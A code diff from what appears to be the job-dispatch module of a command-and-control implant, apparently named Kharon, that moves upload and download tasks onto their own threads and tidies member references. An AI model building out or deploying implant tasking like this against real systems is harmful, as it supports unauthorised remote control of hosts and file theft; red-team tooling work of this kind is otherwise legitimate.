@@ -145,10 +145,10 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
             KhDbg( "executing command id: %d", Current->CmdID );
 
             if ( 
-                Current->CmdID == TkUpload   ||
-                Current->CmdID == TkDownload
+                Current->CmdID == TskUpload   ||
+                Current->CmdID == TskDownload
             ) {
-                // Current->Handle = Self->Krnl32.CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&Execute, Current, 0, 0 );
+                Current->Thread.Handle = Self->Krnl32.CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&this->Execute, Current, 0, &Current->Thread.ID );
             } else {
                 Current->State    = KH_JOB_RUNNING;
                 ERROR_CODE Result = this->Execute( Current );
@@ -165,6 +165,8 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
 auto DECLFN Jobs::Execute(
     _In_ PJOBS Job
 ) -> ERROR_CODE {
+    G_KHARON
+
     for ( INT i = 0; i < TSK_LENGTH; i++ ) {
         if ( Job->CmdID == Self->Tk->Mgmt[i].ID ) {
             return ( Self->Tk->*Self->Tk->Mgmt[i].Run )( Job );
@@ -176,7 +178,7 @@ auto DECLFN Jobs::Execute(
 auto DECLFN Jobs::GetByUUID(
     _In_ PCHAR UUID
 ) -> PJOBS {
-    PJOBS Current = List;
+    PJOBS Current = this->List;
     while ( Current ) {
         if ( Str::CompareA( Current->UUID, UUID ) == 0 ) {
             return Current;
@@ -189,7 +191,7 @@ auto DECLFN Jobs::GetByUUID(
 auto DECLFN Jobs::GetByID(
     _In_ ULONG ID
 ) -> PJOBS {
-    PJOBS Current = List;
+    PJOBS Current = this->List;
     while ( Current ) {
         if ( Current->CmdID == ID ) {
             return Current;
@@ -202,12 +204,12 @@ auto DECLFN Jobs::GetByID(
 auto DECLFN Jobs::Remove(
     _In_ PJOBS Job
 ) -> BOOL {
-    if ( !List ) return FALSE;
+    if ( !this->List ) return FALSE;
     
-    if ( List == Job ) {
-        List = Job->Next;
+    if ( this->List == Job ) {
+        this->List = Job->Next;
     } else {
-        PJOBS Current = List;
+        PJOBS Current = this->List;
         while ( Current->Next && Current->Next != Job ) {
             Current = Current->Next;
         }
@@ -220,7 +222,7 @@ auto DECLFN Jobs::Remove(
     }
     
     Self->Hp->Free( Job );
-    Count--;
+    this->Count--;
 
     return TRUE;
 }
